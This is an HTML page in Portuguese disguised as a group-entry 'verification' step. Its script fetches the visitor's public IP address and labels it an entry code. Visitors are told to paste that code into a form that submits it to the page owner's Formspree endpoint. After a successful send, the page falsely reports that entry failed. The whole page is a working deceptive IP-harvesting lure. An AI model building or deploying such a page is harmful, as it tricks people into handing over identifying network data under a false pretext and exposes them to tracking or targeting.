<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#080b12">
  <title>IP Check</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      padding: 25px 16px;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #080b12;
      color: #e8edf7;
      font-family: Arial, sans-serif;
    }

    .container {
      width: 100%;
      max-width: 440px;
    }

    .logo {
      text-align: center;
      font-size: 28px;
      font-weight: bold;
      margin-bottom: 8px;
    }

    .subtitle {
      text-align: center;
      color: #8b96aa;
      margin-bottom: 28px;
    }

    .card {
      background: #111722;
      border: 1px solid #242d3d;
      border-radius: 16px;
      padding: 22px;
      margin-bottom: 16px;
    }

    .label {
      color: #8b96aa;
      font-size: 13px;
      margin-bottom: 10px;
    }

    .ip {
      font-size: 25px;
      font-weight: bold;
      overflow-wrap: anywhere;
      color: #64f5bd;
    }

    h2 {
      font-size: 18px;
      margin: 0 0 8px;
    }

    .description {
      color: #8b96aa;
      font-size: 13px;
      line-height: 1.5;
      margin-bottom: 20px;
    }

    input, textarea {
      width: 100%;
      padding: 14px;
      margin-bottom: 13px;
      border-radius: 9px;
      border: 1px solid #293448;
      background: #0b1019;
      color: white;
      font: inherit;
      outline: none;
    }

    input:focus, textarea:focus {
      border-color: #64f5bd;
    }

    textarea {
      min-height: 120px;
      resize: vertical;
    }

    button {
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background: #64f5bd;
      color: #07110d;
      font-weight: bold;
      font-size: 15px;
      cursor: pointer;
    }

    button:disabled {
      opacity: 0.6;
      cursor: wait;
    }

    .status {
      text-align: center;
      color: #8b96aa;
      font-size: 13px;
      line-height: 1.5;
      margin-top: 15px;
    }

    .footer {
      text-align: center;
      color: #68758a;
      font-size: 12px;
      margin-top: 20px;
    }
  </style>
</head>

<body>
  <main class="container">

    <div class="logo">
      verificação<span style="color:#64f5bd"></span>
    </div>

    <div class="subtitle">
      Copie o codigo de entrada e cole no espaço de codigo
    </div>

    <section class="card">
      <div class="label">CODIGO DE ENTRADA</div>
      <div class="ip" id="ip">Carregando...</div>
    </section>

    <section class="card">
      <h2>Cole o codigo aqui</h2>

      <div class="description">
        mande o codigo de entrada e entre no grupo.
      </div>

      <form
        id="formulario"
        action="https://formspree.io/f/meewdwnd"
        method="POST"
      >
      

        <input
          name="mensagem"
          placeholder="Digite o codigo de entrada..."
          maxlength="3000"
          required
        ></>

        <button type="submit" id="enviar">
          Enviar codigo
        </button>

        <p class="status" id="status" aria-live="polite"></p>
      </form>
    </section>

    <div class="footer">
      grupo - verificação
    </div>

  </main>

  <script>
    async function consultarIP() {
      const elemento = document.getElementById("ip");

      try {
        const resposta = await fetch("https://api.ipify.org?format=json");
        if (!resposta.ok) throw new Error();

        const dados = await resposta.json();
        elemento.textContent = dados.ip;
      } catch {
        elemento.textContent = "Não foi possível consultar";
      }
    }

    const formulario = document.getElementById("formulario");
    const status = document.getElementById("status");
    const botao = document.getElementById("enviar");

    formulario.addEventListener("submit", async function(evento) {
      evento.preventDefault();

      status.textContent = "Entrando...";
      botao.disabled = true;

      try {
        const resposta = await fetch(formulario.action, {
          method: "POST",
          body: new FormData(formulario),
          headers: {
            "Accept": "application/json"
          }
        });

        if (resposta.ok) {
          status.textContent = "não foi possivel entrar";
          formulario.reset();
        } else {
          status.textContent =
            "Não foi possível enviar. Confira o Formspree e tente novamente.";
        }
      } catch {
        status.textContent =
          "Erro de conexão. Verifique sua internet e tente novamente.";
      } finally {
        botao.disabled = false;
      }
    });

    consultarIP();
  </script>
</body>
</html>
